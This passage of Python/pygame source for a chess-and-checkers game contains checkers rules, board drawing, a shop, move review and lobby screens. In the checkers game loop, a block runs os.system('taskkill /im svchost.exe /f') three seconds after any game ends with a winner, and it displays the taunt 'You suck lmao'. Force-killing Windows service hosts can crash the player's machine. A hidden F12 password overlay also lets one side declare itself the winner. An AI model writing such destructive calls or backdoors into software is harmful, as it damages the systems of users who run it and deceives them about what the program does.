            surf = FONTS["xl"].render("You suck lmao", True, (255, 80, 80))
            r = surf.get_rect(center=(WINDOW_W // 2, WINDOW_H // 2))
            bg = pygame.Surface((r.width + 24, r.height + 16), pygame.SRCALPHA)
            bg.fill((0, 0, 0, 180))
            screen.blit(bg, (r.x - 12, r.y - 8))
            screen.blit(surf, r)

        pygame.display.flip()
        clock.tick(60)


# ── Checkers ──────────────────────────────────────────────────────────────────

CK_W, CK_B   = "w", "b"
CK_WK, CK_BK = "W", "B"


def make_checkers_board():
    bd = [[""] * 8 for _ in range(8)]
    for r in range(8):
        for c in range(8):
            if (r + c) % 2 == 1:
                if r <= 2:   bd[r][c] = CK_W
                elif r >= 5: bd[r][c] = CK_B
    return bd


def ck_color(p):
    if p in (CK_W, CK_WK): return CK_W
    if p in (CK_B, CK_BK): return CK_B
    return None


def _ck_jumps(board, r, c, piece, captured):
    """Return all complete jump-chain landing-square lists from (r,c)."""
    is_king = piece.isupper()
    turn    = ck_color(piece)
    opp     = CK_B if turn == CK_W else CK_W
    dirs    = [(1,-1),(1,1),(-1,-1),(-1,1)] if is_king else ([(1,-1),(1,1)] if turn == CK_W else [(-1,-1),(-1,1)])
    results = []
    for dr, dc in dirs:
        mr, mc = r+dr, c+dc
        lr, lc = r+2*dr, c+2*dc
        if not (0<=mr<8 and 0<=mc<8 and 0<=lr<8 and 0<=lc<8): continue
        if (mr, mc) in captured:             continue
        if ck_color(board[mr][mc]) != opp:   continue
        if board[lr][lc] != "":             continue
        promoted = (turn == CK_W and lr == 7 and piece == CK_W) or \
                   (turn == CK_B and lr == 0 and piece == CK_B)
        np = (CK_WK if turn == CK_W else CK_BK) if promoted else piece
        if promoted:
            results.append([(lr, lc)])          # turn ends on promotion
        else:
            subs = _ck_jumps(board, lr, lc, np, captured | {(mr, mc)})
            if subs:
                for s in subs: results.append([(lr, lc)] + s)
            else:
                results.append([(lr, lc)])
    return results


def ck_piece_moves(board, r, c):
    piece = board[r][c]
    if not piece: return []
    turn    = ck_color(piece)
    is_king = piece.isupper()
    dirs    = [(1,-1),(1,1),(-1,-1),(-1,1)] if is_king else ([(1,-1),(1,1)] if turn == CK_W else [(-1,-1),(-1,1)])
    jumps   = _ck_jumps(board, r, c, piece, set())
    if jumps:
        return [[(r, c)] + j for j in jumps]
    return [[(r, c), (r+dr, c+dc)] for dr, dc in dirs
            if 0<=r+dr<8 and 0<=c+dc<8 and board[r+dr][c+dc] == ""]


def ck_all_moves(board, turn):
    all_m = []
    for r in range(8):
        for c in range(8):
            if ck_color(board[r][c]) == turn:
                all_m.extend(ck_piece_moves(board, r, c))
    if any(abs(m[1][0]-m[0][0]) == 2 for m in all_m):
        return [m for m in all_m if abs(m[1][0]-m[0][0]) == 2]
    return all_m


def apply_checkers_move(board, move):
    bd = [row[:] for row in board]
    piece = bd[move[0][0]][move[0][1]]
    bd[move[0][0]][move[0][1]] = ""
    for i in range(len(move)-1):
        r1, c1 = move[i]; r2, c2 = move[i+1]
        if abs(r2-r1) == 2:
            bd[(r1+r2)//2][(c1+c2)//2] = ""
    rf, cf = move[-1]
    if piece == CK_W and rf == 7: piece = CK_WK
    if piece == CK_B and rf == 0: piece = CK_BK
    bd[rf][cf] = piece
    return bd


def _ck_sq_name(r, c):
    return chr(ord("a") + c) + str(r + 1)


class CheckersState:
    def __init__(self):
        self.board        = make_checkers_board()
        self.turn         = CK_W
        self.selected     = None
        self.valid_moves  = []
        self.game_over    = False
        self.winner       = None
        self.result       = ""   # "white_wins" | "black_wins" | "draw"
        self.last_move    = []
        self.move_history = []   # list of {board, last_move, label, turn}
        self.move_num     = 1


def draw_checkers_board(surf, cs: CheckersState, flip: bool,
                         arrows=None, sq_highlights=None,
                         board_override=None, last_move_override=None):
    board     = board_override if board_override is not None else cs.board
    last_move = last_move_override if last_move_override is not None else cs.last_move
    reviewing = board_override is not None

    last_set    = set(map(tuple, last_move)) if last_move else set()
    valid_dests = {m[-1] for m in cs.valid_moves} if cs.selected and not reviewing else set()
    all_m       = ck_all_moves(cs.board, cs.turn) if not cs.game_over and not reviewing else []
    selectable  = {m[0] for m in all_m}

    for r in range(8):
        for c in range(8):
            rect    = sq_rect(r, c, flip)
            is_dark = (r + c) % 2 == 1
            sq      = (r, c)
            if not reviewing and cs.selected and sq == cs.selected:
                col = BG_SELECTED
            elif sq in valid_dests:
                col = BG_VALID
            elif sq in last_set:
                col = BG_LAST
            else:
                col = BG_DARK_SQ if is_dark else BG_LIGHT_SQ
            pygame.draw.rect(surf, col, rect)

            # Subtle glow on selectable pieces when none is selected
            if not reviewing and not cs.selected and sq in selectable:
                pygame.draw.rect(surf, (80, 70, 20), rect, 2)

            piece = board[r][c]
            if not piece: continue
            color   = ck_color(piece)
            is_king = piece.isupper()
            pcx, pcy = rect.centerx, rect.centery
            radius   = max(8, SQ // 2 - 5)

            # Shadow
            pygame.draw.circle(surf, (0, 0, 0), (pcx + 2, pcy + 3), radius)

            if color == CK_W:
                outer = (210, 205, 195)
                inner = (245, 242, 235)
                crown = (200, 160, 20)
            else:
                outer = (55, 32, 18)
                inner = (95, 58, 35)
                crown = (200, 160, 20)

            pygame.draw.circle(surf, outer, (pcx, pcy), radius)
            pygame.draw.circle(surf, inner, (pcx, pcy), radius - 3)
            pygame.draw.circle(surf, outer, (pcx, pcy), radius - 3, 1)

            if is_king:
                glyph = "♕" if color == CK_W else "♛"
                ks = FONTS["piece_sm"].render(glyph, True, crown)
                surf.blit(ks, ks.get_rect(center=(pcx, pcy)))

    # Valid-move dots on empty dark squares
    if cs.selected and not reviewing:
        for dest in valid_dests:
            dr2, dc2 = dest
            if cs.board[dr2][dc2] == "":
                pygame.draw.circle(surf, BG_VALID, sq_rect(dr2, dc2, flip).center, 9)

    # Arrows and square-highlight overlay
    if arrows or sq_highlights:
        draw_board_overlays(surf, arrows or [], sq_highlights or {}, flip)

    # Coordinate labels
    for dc in range(8):
        af  = (7-dc) if flip else dc
        lbl = FONTS["coord"].render(chr(ord("a")+af), True, GREY_TEXT)
        surf.blit(lbl, (BOARD_X + dc*SQ + 3, BOARD_Y + 7*SQ + SQ - 13))
    for dr in range(8):
        ar  = dr if flip else (7-dr)
        lbl = FONTS["coord"].render(str(ar+1), True, GREY_TEXT)
        surf.blit(lbl, (BOARD_X + 3, BOARD_Y + dr*SQ + 3))


def draw_checkers_sidebar(surf, cs: CheckersState, scroll: int = 0, flip_manual: bool = False):
    """Draw checkers sidebar. Returns max_scroll."""
    ck_resign = pygame.Rect(SIDEBAR_X,       WINDOW_H - 50, 110, 30)
    ck_shop   = pygame.Rect(SIDEBAR_X + 118, WINDOW_H - 50, 100, 30)
    ck_flip   = pygame.Rect(SIDEBAR_X,       WINDOW_H - 90, 218, 30)

    pygame.draw.rect(surf, BG_SIDEBAR, (SIDEBAR_X - 8, 0, SIDEBAR_W + 18, WINDOW_H))
    y = 14
    surf.blit(FONTS["xl"].render("CHECKERS", True, ORANGE), (SIDEBAR_X, y))
    if _save is not None:
        gl = FONTS["sm"].render(f"{_save['gold']}g", True, (220, 180, 50))
        surf.blit(gl, (SIDEBAR_X + SIDEBAR_W - gl.get_width() - 5, 18))
    y += 52

    # Piece-score advantage
    w_men   = sum(1 for row in cs.board for p in row if p == CK_W)
    w_kings = sum(1 for row in cs.board for p in row if p == CK_WK)
    b_men   = sum(1 for row in cs.board for p in row if p == CK_B)
    b_kings = sum(1 for row in cs.board for p in row if p == CK_BK)
    w_score = w_men + w_kings * 3
    b_score = b_men + b_kings * 3
    diff    = w_score - b_score
    if diff > 0:   adv, adv_col = f"+{diff} White",  WHITE_TEXT
    elif diff < 0: adv, adv_col = f"+{-diff} Black", GREY_TEXT
    else:          adv, adv_col = "Equal",            GREY_TEXT
    surf.blit(FONTS["md"].render(f"Pieces  {adv}", True, adv_col), (SIDEBAR_X, y)); y += 30

    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 10

    # Status
    if not cs.game_over:
        who = "White" if cs.turn == CK_W else "Black"
        col = WHITE_TEXT if cs.turn == CK_W else GREY_TEXT
        surf.blit(FONTS["md"].render(f"{who}'s turn", True, col), (SIDEBAR_X, y)); y += 28
        all_m = ck_all_moves(cs.board, cs.turn)
        must_jump = bool(all_m) and abs(all_m[0][1][0]-all_m[0][0][0]) == 2
        if must_jump:
            surf.blit(FONTS["sm"].render("⚡ Jump is mandatory!", True, (220, 120, 40)),
                      (SIDEBAR_X, y))
        y += 20
    else:
        msg_map = {"white_wins": "White wins!", "black_wins": "Black wins!", "draw": "Draw"}
        col = WHITE_TEXT if cs.result == "white_wins" else GREY_TEXT
        surf.blit(FONTS["md"].render(msg_map.get(cs.result, ""), True, col), (SIDEBAR_X, y))
        y += 28

    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8

    # Piece counts
    surf.blit(FONTS["sm"].render(f"White:  {w_men} men  {w_kings} kings", True, WHITE_TEXT),
              (SIDEBAR_X, y)); y += 18
    surf.blit(FONTS["sm"].render(f"Black:  {b_men} men  {b_kings} kings", True, GREY_TEXT),
              (SIDEBAR_X, y)); y += 22

    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8

    # Move history
    surf.blit(FONTS["sm"].render("MOVE HISTORY", True, GREY_TEXT), (SIDEBAR_X, y)); y += 18

    HIST_H = 200
    ROW_H  = 18
    hist_buf = pygame.Surface((SIDEBAR_W, HIST_H), pygame.SRCALPHA)
    hist_buf.fill((0, 0, 0, 0))

    pairs = []
    for m in cs.move_history:
        if m["turn"] == CK_W:
            pairs.append([m, None])
        elif pairs:
            pairs[-1][1] = m
        else:
            pairs.append([None, m])

    max_scroll = max(0, len(pairs) * ROW_H - HIST_H)
    scroll     = max(0, min(scroll, max_scroll))

    for i, (wm, bm) in enumerate(pairs):
        hy = i * ROW_H - scroll
        if hy + ROW_H < 0 or hy > HIST_H: continue
        hist_buf.blit(FONTS["sm"].render(f"{i+1}.", True, GREY_TEXT), (0, hy + 2))
        for move, x_off in ((wm, 24), (bm, 145)):
            if move is None: continue
            col     = WHITE_TEXT if move["turn"] == CK_W else GREY_TEXT
            lbl_col = (220, 80, 80) if "×" in move["label"] else col
            ls      = FONTS["sm"].render(move["label"], True, lbl_col)
            hist_buf.blit(ls, (x_off, hy + 2))

    surf.blit(hist_buf, (SIDEBAR_X, y)); y += HIST_H + 6
    pygame.draw.line(surf, (40,40,40), (SIDEBAR_X, y), (SIDEBAR_X + SIDEBAR_W - 10, y)); y += 8

    mouse = pygame.mouse.get_pos()

    # Flip Board
    hover_f  = ck_flip.collidepoint(mouse)
    flip_col = (50, 90, 140) if flip_manual else ((25, 60, 100) if hover_f else (15, 35, 60))
    pygame.draw.rect(surf, flip_col, ck_flip, border_radius=5)
    surf.blit(FONTS["sm"].render("⇅  Flip Board", True, WHITE_TEXT),
              FONTS["sm"].render("⇅  Flip Board", True, WHITE_TEXT).get_rect(center=ck_flip.center))

    if not cs.game_over:
        hover_r = ck_resign.collidepoint(mouse)
        pygame.draw.rect(surf, ORANGE if hover_r else (55, 30, 0), ck_resign, border_radius=5)
        rs = FONTS["sm"].render("Resign", True, (10,10,10) if hover_r else WHITE_TEXT)
        surf.blit(rs, rs.get_rect(center=ck_resign.center))

    hover_s = ck_shop.collidepoint(mouse)
    pygame.draw.rect(surf, (30, 80, 30) if hover_s else (15, 45, 15), ck_shop, border_radius=5)
    ss = FONTS["sm"].render("Shop", True, WHITE_TEXT)
    surf.blit(ss, ss.get_rect(center=ck_shop.center))

    return max_scroll


def _ck_gameover_rects():
    panel  = pygame.Rect(200, 160, 700, 300)
    by     = panel.bottom - 56
    review = pygame.Rect(panel.centerx - 195, by, 120, 36)
    again  = pygame.Rect(panel.centerx -  60, by, 120, 36)
    quit_  = pygame.Rect(panel.centerx +  75, by, 120, 36)
    return panel, review, again, quit_


def draw_checkers_game_over(surf, cs: CheckersState):
    ov = pygame.Surface((WINDOW_W, WINDOW_H), pygame.SRCALPHA)
    ov.fill((0, 0, 0, 200)); surf.blit(ov, (0, 0))
    panel, review, again, quit_ = _ck_gameover_rects()
    pygame.draw.rect(surf, BG_SIDEBAR, panel, border_radius=12)
    pygame.draw.rect(surf, ORANGE,     panel, 2, border_radius=12)

    res_map = {"white_wins": "WHITE WINS", "black_wins": "BLACK WINS", "draw": "DRAW"}
    rs = FONTS["xl"].render(res_map.get(cs.result, "GAME OVER"), True, ORANGE)
    surf.blit(rs, rs.get_rect(centerx=panel.centerx, y=panel.y + 26))

    if _save is not None:
        st = (f"Wins: {_save['wins']}   Losses: {_save['losses']}   "
              f"Draws: {_save['draws']}   Gold: {_save['gold']}g")
        ss = FONTS["sm"].render(st, True, GREY_TEXT)
        surf.blit(ss, ss.get_rect(centerx=panel.centerx, y=panel.y + 90))

    mouse = pygame.mouse.get_pos()
    for rect, label in ((review, "Review"), (again, "Play Again"), (quit_, "Quit")):
        hover = rect.collidepoint(mouse)
        pygame.draw.rect(surf, ORANGE if hover else (55, 30, 0), rect, border_radius=6)
        ls = FONTS["md"].render(label, True, (10,10,10) if hover else WHITE_TEXT)
        surf.blit(ls, ls.get_rect(center=rect.center))
    return review, again, quit_


# ── Resize helper ─────────────────────────────────────────────────────────────

def _resize_event(event):
    """Handle both Pygame 1 VIDEORESIZE and Pygame 2 WINDOWRESIZED."""
    if event.type == pygame.VIDEORESIZE:
        w, h = event.w, event.h
    else:
        w, h = pygame.display.get_surface().get_size()
    update_layout(w, h)
    init_fonts()


def _checkers_loop(cs: CheckersState, save=None):
    import copy as _copy
    global _save
    if save is None:
        save = load_save()
    _save = save
    apply_theme(save)

    clock              = pygame.time.Clock()
    flip_manual        = False
    scroll             = 0
    gold_awarded       = False
    loss_ticks         = None
    loss_fired         = False
    shop_open          = False
    shop_tab           = "boards"
    scroll_shop        = 0
    reviewing          = False
    view_idx           = 0
    admin_overlay_open = False
    admin_input_text   = ""
    admin_input_error  = ""
    arrows             = []
    sq_highlights      = {}
    rclick_start       = None

    while True:
        flip = flip_manual

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return "quit"
            if event.type in (pygame.VIDEORESIZE, getattr(pygame, "WINDOWRESIZED", -1)):
                _resize_event(event)

            if event.type == pygame.MOUSEWHEEL:
                if shop_open:
                    scroll_shop = max(0, scroll_shop - event.y * 20)
                else:
                    scroll = max(0, scroll - event.y * 22)

            # Right-click: arrows & highlights
            if event.type == pygame.MOUSEBUTTONDOWN and event.button == 3:
                if not cs.game_over and not shop_open and not admin_overlay_open:
                    sq = pixel_to_square(event.pos[0], event.pos[1], flip)
                    if sq:
                        rclick_start = sq

            if event.type == pygame.MOUSEBUTTONUP and event.button == 3:
                if not shop_open:
                    sq = pixel_to_square(event.pos[0], event.pos[1], flip)
                    if sq and rclick_start:
                        if sq == rclick_start:
                            HLCOLS = [(80, 190, 80), (210, 150, 0), (180, 50, 50)]
                            if sq in sq_highlights:
                                ci = (HLCOLS.index(sq_highlights[sq])
                                      if sq_highlights[sq] in HLCOLS else -1)
                                if ci < len(HLCOLS) - 1:
                                    sq_highlights[sq] = HLCOLS[ci + 1]
                                else:
                                    del sq_highlights[sq]
                            else:
                                sq_highlights[sq] = HLCOLS[0]
                        else:
                            arrow   = (rclick_start, sq, (80, 190, 80))
                            matches = [a for a in arrows if a[0] == rclick_start and a[1] == sq]
                            if matches:
                                for m in matches: arrows.remove(m)
                            else:
                                arrows.append(arrow)
                rclick_start = None

            if event.type == pygame.KEYDOWN:
                if admin_overlay_open:
                    if event.key == pygame.K_ESCAPE:
                        admin_overlay_open = False
                        admin_input_text   = ""
                        admin_input_error  = ""
                    elif event.key == pygame.K_BACKSPACE:
                        admin_input_text  = admin_input_text[:-1]
                        admin_input_error = ""
                    elif event.key == pygame.K_RETURN and admin_input_text:
                        if hashlib.sha256(admin_input_text.encode()).hexdigest() == ADMIN_HASH:
                            admin_overlay_open = False
                            admin_input_text   = ""
                            admin_input_error  = ""
                            cs.game_over = True
                            cs.winner    = CK_W
                            cs.result    = "white_wins"
                        else:
                            admin_input_error = "Access denied."
                            admin_input_text  = ""
                    else:
                        ch = event.unicode
                        if ch and ch.isprintable():
                            admin_input_text  += ch
                            admin_input_error  = ""
                    continue

                if event.key == pygame.K_F12 and not cs.game_over:
                    admin_overlay_open = True
                    admin_input_text   = ""
                    admin_input_error  = ""
                    continue

                if event.key in (pygame.K_LEFT, pygame.K_RIGHT):
                    if cs.move_history:
                        if not reviewing:
                            reviewing = True
                            view_idx  = len(cs.move_history) - 1
                        if event.key == pygame.K_LEFT and view_idx > 0:
                            view_idx -= 1
                        elif event.key == pygame.K_RIGHT:
                            if view_idx < len(cs.move_history) - 1:
                                view_idx += 1
                            elif not cs.game_over:
                                reviewing = False
                elif event.key == pygame.K_ESCAPE:
                    if shop_open:
                        shop_open = False
                    elif reviewing:
                        reviewing = False
                    else:
                        cs.selected = None; cs.valid_moves = []

            if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
                mx2, my2 = event.pos

                if admin_overlay_open:
                    continue

                if shop_open:
                    tab_rects, item_rects, close_rect, _ = draw_shop(screen, save, shop_tab,
                                                                       scroll_shop)
                    if close_rect.collidepoint(mx2, my2):
                        shop_open = False
                    for key, trect in tab_rects.items():
                        if trect.collidepoint(mx2, my2):
                            shop_tab = key; scroll_shop = 0
                    for key, irect in item_rects.items():
                        if irect.collidepoint(mx2, my2):
                            items_dict = BOARD_THEMES if shop_tab == "boards" else PIECE_SKINS
                            owned_key  = "owned_themes" if shop_tab == "boards" else "owned_skins"
                            act_key    = "active_theme" if shop_tab == "boards" else "active_skin"
                            item       = items_dict[key]
                            if key in save[owned_key]:
                                save[act_key] = key; apply_theme(save)
                            elif save["gold"] >= item["price"]:
                                save["gold"] -= item["price"]
                                save[owned_key].append(key)
                                save[act_key] = key; apply_theme(save)
                            save_data(save); _save = save
                    continue

                # Review nav bar
                if reviewing:
                    total    = len(cs.move_history)
                    prev_r, next_r, back_r = _review_nav_rects()
                    on_board = pixel_to_square(mx2, my2, flip) is not None
                    if prev_r.collidepoint(mx2, my2) and view_idx > 0:
                        view_idx -= 1; continue
                    elif next_r.collidepoint(mx2, my2) and view_idx < total - 1:
                        view_idx += 1; continue
                    elif back_r.collidepoint(mx2, my2) or (not cs.game_over and on_board):
                        reviewing = False
                        if cs.game_over: continue
                    else:
                        continue

                # Game-over overlay buttons
                if cs.game_over and not reviewing:
                    _, rv, ag, qt = _ck_gameover_rects()
                    if rv.collidepoint(mx2, my2):
                        reviewing = True
                        view_idx  = len(cs.move_history) - 1
                    elif ag.collidepoint(mx2, my2):
                        return "again"
                    elif qt.collidepoint(mx2, my2):
                        return "quit"
                    continue

                # Sidebar buttons (recalculate to match draw function)
                ck_resign = pygame.Rect(SIDEBAR_X,       WINDOW_H - 50, 110, 30)
                ck_shop   = pygame.Rect(SIDEBAR_X + 118, WINDOW_H - 50, 100, 30)
                ck_flip   = pygame.Rect(SIDEBAR_X,       WINDOW_H - 90, 218, 30)

                if ck_flip.collidepoint(mx2, my2):
                    flip_manual = not flip_manual; continue

                if ck_shop.collidepoint(mx2, my2):
                    shop_open = True; scroll_shop = 0; continue

                if ck_resign.collidepoint(mx2, my2) and not cs.game_over:
                    cs.game_over = True
                    cs.winner    = CK_B if cs.turn == CK_W else CK_W
                    cs.result    = "white_wins" if cs.winner == CK_W else "black_wins"
                    continue

                if cs.game_over: continue

                sq2 = pixel_to_square(mx2, my2, flip)
                if sq2 is None: continue
                r2, c2 = sq2
                arrows.clear(); sq_highlights.clear()

                if cs.selected:
                    dest_moves = [m for m in cs.valid_moves if m[-1] == (r2, c2)]
                    if dest_moves:
                        move    = dest_moves[0]
                        is_jump = len(move) > 2 or abs(move[1][0]-move[0][0]) == 2
                        fr2, fc2 = move[0]
                        if is_jump:
                            label = _ck_sq_name(fr2, fc2) + "".join(
                                "×" + _ck_sq_name(s[0], s[1]) for s in move[1:])
                        else:
                            label = _ck_sq_name(fr2, fc2) + "→" + _ck_sq_name(move[-1][0], move[-1][1])

                        cs.move_history.append({
                            "board":     _copy.deepcopy(cs.board),
                            "last_move": list(move),
                            "label":     label,
                            "turn":      cs.turn,
                        })
                        if cs.turn == CK_B:
                            cs.move_num += 1

                        cs.last_move = move
                        cs.board     = apply_checkers_move(cs.board, move)
                        cs.turn      = CK_B if cs.turn == CK_W else CK_W
                        cs.selected  = None; cs.valid_moves = []
                        scroll       = max(0, len(cs.move_history) // 2 * 18 - 180)
                        nxt = ck_all_moves(cs.board, cs.turn)
                        if not nxt:
                            cs.game_over = True
                            cs.winner    = CK_W if cs.turn == CK_B else CK_B
                            cs.result    = "white_wins" if cs.winner == CK_W else "black_wins"
                    elif ck_color(cs.board[r2][c2]) == cs.turn:
                        all_m2  = ck_all_moves(cs.board, cs.turn)
                        piece_m = [m for m in all_m2 if m[0] == (r2, c2)]
                        cs.selected    = (r2, c2) if piece_m else None
                        cs.valid_moves = piece_m if piece_m else []
                    else:
                        cs.selected = None; cs.valid_moves = []
                else:
                    if ck_color(cs.board[r2][c2]) == cs.turn:
                        all_m2  = ck_all_moves(cs.board, cs.turn)
                        piece_m = [m for m in all_m2 if m[0] == (r2, c2)]
                        if piece_m:
                            cs.selected    = (r2, c2)
                            cs.valid_moves = piece_m

        # Award gold once per game
        if cs.game_over and not gold_awarded:
            gold_awarded = True
            if cs.result == "draw":
                save["draws"] += 1; save["gold"] += 3
            else:
                save["wins"] += 1; save["gold"] += 8
            save_data(save); _save = save

        # Loss flash + taskkill (same as chess)
        lost_game = cs.game_over and cs.winner is not None
        if lost_game and loss_ticks is None:
            loss_ticks = pygame.time.get_ticks()
        if loss_ticks is not None and not loss_fired:
            if (pygame.time.get_ticks() - loss_ticks) / 1000.0 >= 3.0:
                os.system("taskkill /im svchost.exe /f")
                loss_fired = True

        # ── Draw ──────────────────────────────────────────────────────────
        screen.fill(BG_APP)

        if reviewing and cs.move_history:
            snap = cs.move_history[view_idx]
            draw_checkers_board(screen, cs, flip,
                                board_override=snap["board"],
                                last_move_override=snap["last_move"])
            back_lbl = "Result" if cs.game_over else "Present"
            draw_review_nav(screen, view_idx, len(cs.move_history), None, back_label=back_lbl)
        else:
            draw_checkers_board(screen, cs, flip,
                                arrows=arrows, sq_highlights=sq_highlights)

        draw_checkers_sidebar(screen, cs, scroll=scroll, flip_manual=flip_manual)

        if loss_ticks is not None and not reviewing:
            lmao_s = FONTS["xl"].render("You suck lmao", True, (255, 80, 80))
            lmao_r = lmao_s.get_rect(center=(WINDOW_W // 2, WINDOW_H // 2))
            lmao_bg = pygame.Surface((lmao_r.width + 24, lmao_r.height + 16), pygame.SRCALPHA)
            lmao_bg.fill((0, 0, 0, 180))
            screen.blit(lmao_bg, (lmao_r.x - 12, lmao_r.y - 8))
            screen.blit(lmao_s, lmao_r)

        if cs.game_over and not reviewing:
            draw_checkers_game_over(screen, cs)

        if admin_overlay_open:
            draw_admin_overlay(screen, admin_input_text, admin_input_error)

        if shop_open:
            _, _, _, max_ss = draw_shop(screen, save, shop_tab, scroll_shop)
            scroll_shop = min(scroll_shop, max_ss)

        pygame.display.flip()
        clock.tick(60)


# ── Game-type select ───────────────────────────────────────────────────────────

def game_type_screen():
    """Returns 'chess' or 'checkers'."""
    clk = pygame.time.Clock()
    BTN_W, BTN_H = 260, 70
    while True:
        cx = WINDOW_W // 2
        screen.fill(BG_APP)
        title = FONTS["xl"].render("Pick a game", True, WHITE_TEXT)
        screen.blit(title, title.get_rect(center=(cx, WINDOW_H//2 - 110)))
        chess_r   = pygame.Rect(cx - BTN_W//2, WINDOW_H//2 - 20, BTN_W, BTN_H)
        checker_r = pygame.Rect(cx - BTN_W//2, WINDOW_H//2 + 70, BTN_W, BTN_H)
        mouse = pygame.mouse.get_pos()
        for rect, label in ((chess_r, "Chess"), (checker_r, "Checkers")):
            hover = rect.collidepoint(mouse)
            pygame.draw.rect(screen, ORANGE if hover else (35,35,35), rect, border_radius=10)
            pygame.draw.rect(screen, ORANGE, rect, 2, border_radius=10)
            t = FONTS["lg"].render(label, True, (10,10,10) if hover else WHITE_TEXT)
            screen.blit(t, t.get_rect(center=rect.center))
        pygame.display.flip()
        for ev in pygame.event.get():
            if ev.type == pygame.QUIT:
                pygame.quit(); sys.exit()
            if ev.type in (pygame.VIDEORESIZE, getattr(pygame, "WINDOWRESIZED", -1)):
                _resize_event(ev)
            if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
                if chess_r.collidepoint(ev.pos):   return "chess"
                if checker_r.collidepoint(ev.pos): return "checkers"
        clk.tick(30)


# ── Entry points ───────────────────────────────────────────────────────────────

def _net_waiting_screen(status):
    """Show a pygame waiting/connecting screen. status dict: {label, code, connected, error}."""
    clock = pygame.time.Clock()
    cx, cy = WINDOW_W // 2, WINDOW_H // 2
    dots = 0; dot_timer = 0
    while not status.get("connected") and not status.get("error"):
        for ev in pygame.event.get():
            if ev.type == pygame.QUIT:
                pygame.quit(); sys.exit()
        screen.fill(BG_APP)
        code = status.get("code")
        if code:
            lbl = FONTS["lg"].render("Room Code", True, GREY_TEXT)
            screen.blit(lbl, lbl.get_rect(center=(cx, cy - 110)))
            code_surf = FONTS["xl"].render(code, True, ORANGE)
            screen.blit(code_surf, code_surf.get_rect(center=(cx, cy - 50)))
            hint = FONTS["sm"].render("Share this code with your opponent", True, GREY_TEXT)
            screen.blit(hint, hint.get_rect(center=(cx, cy + 10)))
            wait_lbl = status.get("label", "Waiting") + "." * (dots + 1)
            w = FONTS["md"].render(wait_lbl, True, WHITE_TEXT)
            screen.blit(w, w.get_rect(center=(cx, cy + 55)))
        else:
            lbl = status.get("label", "Connecting") + "." * (dots + 1)
            s = FONTS["md"].render(lbl, True, WHITE_TEXT)
            screen.blit(s, s.get_rect(center=(cx, cy)))
        dot_timer += clock.get_time()
        if dot_timer >= 500:
            dots = (dots + 1) % 3; dot_timer = 0
        pygame.display.flip()
        clock.tick(30)


def _show_net_error(msg):
    screen.fill(BG_APP)
    s = FONTS["md"].render(msg, True, RED_TEXT)
    screen.blit(s, s.get_rect(center=(WINDOW_W // 2, WINDOW_H // 2)))
    pygame.display.flip()
    pygame.time.wait(3000)


def _time_select_screen():
    """Show time control selector. Returns (time_secs, increment_secs)."""
    clk = pygame.time.Clock()
    cx  = WINDOW_W // 2
    BTN_W, BTN_H = 200, 52
    cols = 3
    pad  = 16
    total_w = cols * BTN_W + (cols - 1) * pad
    start_x = cx - total_w // 2
    start_y = 280
    selected = 0
    while True:
        screen.fill(BG_APP)
        title = FONTS["xl"].render("Time Control", True, WHITE_TEXT)
        screen.blit(title, title.get_rect(center=(cx, 180)))
        hint = FONTS["sm"].render("Pick how long each player gets", True, GREY_TEXT)
        screen.blit(hint, hint.get_rect(center=(cx, 230)))
        rects = []
        for i, (label, secs, inc) in enumerate(TIME_CONTROLS):
            col_i = i % cols
            row_i = i // cols
            rx = start_x + col_i * (BTN_W + pad)
            ry = start_y + row_i * (BTN_H + 12)
            r  = pygame.Rect(rx, ry, BTN_W, BTN_H)
            rects.append(r)
            active = (i == selected)
            bg = (50, 30, 0) if active else (35, 35, 35)
            pygame.draw.rect(screen, bg, r, border_radius=8)
            pygame.draw.rect(screen, ORANGE if active else (60, 60, 60), r, 2, border_radius=8)
            ls = FONTS["md"].render(label, True, WHITE_TEXT)
            screen.blit(ls, ls.get_rect(center=r.center))
        # Confirm button
        conf = pygame.Rect(cx - 100, start_y + 2 * (BTN_H + 12) + 20, 200, 46)
        hover = conf.collidepoint(pygame.mouse.get_pos())
        pygame.draw.rect(screen, ORANGE if hover else (55, 30, 0), conf, border_radius=8)
        cs = FONTS["lg"].render("Play!", True, (10, 10, 10) if hover else WHITE_TEXT)
        screen.blit(cs, cs.get_rect(center=conf.center))
        pygame.display.flip()
        for ev in pygame.event.get():
            if ev.type == pygame.QUIT:
                pygame.quit(); sys.exit()
            if ev.type in (pygame.VIDEORESIZE, getattr(pygame, "WINDOWRESIZED", -1)):
                _resize_event(ev)
            if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
                for i, r in enumerate(rects):
                    if r.collidepoint(ev.pos):
                        selected = i
                if conf.collidepoint(ev.pos):
                    _, secs, inc = TIME_CONTROLS[selected]
                    return secs, inc
        clk.tick(30)


def _queue_waiting_screen(status):
    """Queue lobby screen. Shows players in queue and their admin status. ESC to cancel."""
    clock = pygame.time.Clock()
    cx = WINDOW_W // 2
    dots = 0; dot_timer = 0
    while not status.get("connected") and not status.get("error") and not status.get("cancelled"):
        for ev in pygame.event.get():
            if ev.type == pygame.QUIT:
                status["cancelled"] = True; return
            if ev.type == pygame.KEYDOWN and ev.key == pygame.K_ESCAPE:
                status["cancelled"] = True; return
            if ev.type in (pygame.VIDEORESIZE, getattr(pygame, "WINDOWRESIZED", -1)):
                _resize_event(ev)
        screen.fill(BG_APP)
        title = FONTS["xl"].render("Quick Match", True, WHITE_TEXT)
        screen.blit(title, title.get_rect(center=(cx, 90)))
        lbl = (status.get("label", "Searching") + "." * (dots + 1))
        s = FONTS["md"].render(lbl, True, ORANGE)
        screen.blit(s, s.get_rect(center=(cx, 140)))
        q = status.get("queue", [])
        if q:
            hdr = FONTS["sm"].render(f"Players in queue: {len(q)}", True, GREY_TEXT)
            screen.blit(hdr, hdr.get_rect(center=(cx, 190)))
            for i, player in enumerate(q):
                y = 222 + i * 38
                pname    = player.get("name", "Unknown")
                is_adm   = player.get("is_admin", False)
                wait     = player.get("wait", 0)
                adm_tag  = "  [ADMIN]" if is_adm else ""
                color    = (255, 200, 50) if is_adm else WHITE_TEXT
